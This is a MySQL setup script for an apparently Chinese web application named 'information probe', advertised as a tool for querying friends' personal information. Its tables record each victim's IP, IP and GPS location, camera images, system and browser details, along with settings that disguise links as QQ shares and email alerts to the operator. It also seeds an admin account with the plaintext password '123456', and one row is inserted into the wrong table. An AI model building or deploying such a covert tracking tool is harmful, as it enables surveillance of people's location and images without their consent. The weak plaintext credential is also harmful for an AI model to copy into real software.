DROP TABLE IF EXISTS `config_website`;</explode>
CREATE TABLE `config_website` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `option_name` text,
  `option_value` text,
	PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;</explode>

DROP TABLE IF EXISTS `list_function`;</explode>
CREATE TABLE `list_function` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `option_name` text,
  `option_value` text,
	PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;</explode>

DROP TABLE IF EXISTS `list_statistics`;</explode>
CREATE TABLE `list_statistics` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `type` text,
  `number` text,
	PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;</explode>

DROP TABLE IF EXISTS `list_admin`;</explode>
CREATE TABLE `list_admin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` text,
  `password` text,
	PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;</explode>

DROP TABLE IF EXISTS `list_probe`;</explode>
CREATE TABLE `list_probe` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `key_probe` text,
  `probe_page` text,
  `ip_location_function` text,
  `gps_location_function` text,
  `camera_img_function` text,
  `email_notification_function` text,
  `email` text,
  `qqshare_title` text,
  `qqshare_pics` text,
  `qqshare_summary` text,
  `qqshare_desc` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;</explode>

DROP TABLE IF EXISTS `list_ip`;</explode>
CREATE TABLE `list_ip` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `key_ip` text,
  `ip` text,
  `ip_location` text,
  `ip_lonlat` text,
  `gps_location` text,
  `gps_lonlat` text,
  `camera_img` text,
  `system` text,
  `browser` text,
  `browser_ua` text,
  `browser_language` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;</explode>

INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('1', 'title', '信息探针');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('2', 'subtitle', '专业查询好友个人信息');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('3', 'keywords', '信息探针,位置探针,IP探针,好友IP,IP定位,查询好友IP,好友地址');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('4', 'description', '信息探针是一款基于Layui开发的专业查询好友个人信息的程序');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('5', 'code_bottom', '');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('6', 'code_probe_add_top', '');</explode>
INSERT INTO `list_function`(`id`, `option_name`, `option_value`) VALUES
('7', 'code_probe_query_top', '');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('8', 'background_img', '');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('9', 'background_music', '');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('10', 'smtp_server', '');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('11', 'smtp_server_port', '');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('12', 'smtp_user', '');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('13', 'smtp_user_mail', '');</explode>
INSERT INTO `config_website`(`id`, `option_name`, `option_value`) VALUES
('14', 'smtp_user_password', '');</explode>


INSERT INTO `list_function`(`id`, `option_name`, `option_value`) VALUES
('1', 'api_function', '1');</explode>
INSERT INTO `list_function`(`id`, `option_name`, `option_value`) VALUES
('2', 'statistics_website_visit_function', '1');</explode>
INSERT INTO `list_function`(`id`, `option_name`, `option_value`) VALUES
('3', 'statistics_probe_add_function', '1');</explode>
INSERT INTO `list_function`(`id`, `option_name`, `option_value`) VALUES
('4', 'statistics_probe_query_function', '1');</explode>
INSERT INTO `list_function`(`id`, `option_name`, `option_value`) VALUES
('5', 'statistics_use_api_function', '1');</explode>
INSERT INTO `list_function`(`id`, `option_name`, `option_value`) VALUES
('6', 'statistics_email_notification_function', '1');</explode>

INSERT INTO `list_statistics`(`id`, `type`, `number`) VALUES
('1', 'statistics_website_visit_number', '0');</explode>
INSERT INTO `list_statistics`(`id`, `type`, `number`) VALUES
('2', 'statistics_probe_add_number', '0');</explode>
INSERT INTO `list_statistics`(`id`, `type`, `number`) VALUES
('3', 'statistics_probe_query_number', '0');</explode>
INSERT INTO `list_statistics`(`id`, `type`, `number`) VALUES
('4', 'statistics_use_api_number', '0');</explode>
INSERT INTO `list_statistics`(`id`, `type`, `number`) VALUES
('5', 'statistics_email_notification_number', '0');</explode>

INSERT INTO `list_admin`(`id`, `username`, `password`) VALUES
('1', 'admin', '123456');</explode>